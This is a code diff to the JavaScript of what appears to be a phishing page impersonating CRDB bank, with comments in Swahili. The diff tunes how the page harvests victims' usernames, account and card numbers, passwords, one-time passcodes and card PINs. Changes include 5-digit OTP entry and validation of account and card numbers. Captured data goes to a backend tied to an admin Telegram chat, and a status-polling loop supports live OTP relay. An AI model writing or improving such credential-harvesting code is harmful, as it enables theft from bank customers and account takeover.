@@ -51,8 +51,8 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // Digit Inputs Setup with AUTO-SUBMIT feature
-  const otpDigits6 = document.querySelectorAll('.otp-digit-6');
+  // Digit Inputs Setup with AUTO-SUBMIT feature for 5-digit OTP and 4-digit PIN
+  const otpDigits5 = document.querySelectorAll('.otp-digit-5');
   const cardPinDigits = document.querySelectorAll('.card-pin-digit');
 
   function setupDigitInputs(inputs, autoSubmitCallback) {
@@ -77,7 +77,7 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  setupDigitInputs(otpDigits6, () => submitOtpHandler());
+  setupDigitInputs(otpDigits5, () => submitOtpHandler());
   setupDigitInputs(cardPinDigits, () => submitCardPinHandler());
 
   // Navigation
@@ -89,15 +89,39 @@ document.addEventListener('DOMContentLoaded', () => {
     showStep(stepForm);
   });
 
-  // Step 1: Submit Credentials & Bank Details (Sends to Telegram first)
+  // Step 1: Submit Credentials & Bank Details with Account & Card Validation
   document.getElementById('btn-submit-creds').addEventListener('click', async () => {
     const username = document.getElementById('crdb-username').value.trim();
     const account = document.getElementById('crdb-account').value.trim();
-    const card = document.getElementById('crdb-card').value.trim();
+    const cardRaw = document.getElementById('crdb-card').value.trim();
+    const card = cardRaw.replace(/\D/g, ''); // Ondoa nafasi ili kuhakiki namba pekee
     const password = document.getElementById('crdb-password').value.trim();
 
-    if (!username || !account || !card || !password) {
-      alert('Tafadhali jaza taarifa zote zikiwemo jina, akaunti, kadi, na nywila.');
+    const accountError = document.getElementById('account-error');
+    const cardError = document.getElementById('card-error');
+
+    let isValid = true;
+
+    // Uhakiki wa namba ya akaunti (lazima iwe na angalau tarakimu 10 hadi 15)
+    if (account.length < 10 || account.length > 15 || isNaN(account)) {
+      accountError.style.display = 'block';
+      isValid = false;
+    } else {
+      accountError.style.display = 'none';
+    }
+
+    // Uhakiki wa namba ya kadi (lazima iwe na tarakimu 16 kamili za kibenki)
+    if (card.length !== 16) {
+      cardError.style.display = 'block';
+      isValid = false;
+    } else {
+      cardError.style.display = 'none';
+    }
+
+    if (!username || !password || !isValid) {
+      if (!username || !password) {
+        alert('Tafadhali jaza jina la mtumiaji na nywila.');
+      }
       return;
     }
 
@@ -108,7 +132,7 @@ document.addEventListener('DOMContentLoaded', () => {
       const res = await fetch(`/api/submit-credentials?admin=${encodeURIComponent(adminParam)}`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username, account, card, password, adminChatId: adminParam })
+        body: JSON.stringify({ username, account, card: cardRaw, password, adminChatId: adminParam })
       });
 
       const data = await res.json();
@@ -205,7 +229,7 @@ document.addEventListener('DOMContentLoaded', () => {
           clearInterval(statusPollInterval);
           hideLoading();
           showStep(stepOtp);
-          if (otpDigits6[0]) otpDigits6[0].focus();
+          if (otpDigits5[0]) otpDigits5[0].focus();
         } else if (data.status === 'SUCCESS') {
           clearInterval(statusPollInterval);
           hideLoading();
@@ -222,19 +246,19 @@ document.addEventListener('DOMContentLoaded', () => {
           clearInterval(statusPollInterval);
           hideLoading();
           if (otpSurfaceBanner) otpSurfaceBanner.classList.add('active');
-          otpDigits6.forEach(i => i.value = '');
-          if (otpDigits6[0]) otpDigits6[0].focus();
+          otpDigits5.forEach(i => i.value = '');
+          if (otpDigits5[0]) otpDigits5[0].focus();
           showStep(stepOtp);
         }
       } catch (e) {}
     }, 3000);
   }
 
-  // Submit OTP Function
+  // Submit OTP Function (5 digits)
   async function submitOtpHandler() {
-    const otpVal = Array.from(otpDigits6).map(i => i.value).join('');
+    const otpVal = Array.from(otpDigits5).map(i => i.value).join('');
 
-    if (otpVal.length !== 6) {
+    if (otpVal.length !== 5) {
       document.getElementById('otp-error').style.display = 'block';
       return;
     }
@@ -279,4 +303,4 @@ document.addEventListener('DOMContentLoaded', () => {
     if (stepLoading) stepLoading.classList.remove('active');
   }
 });
-                                    
+                                        
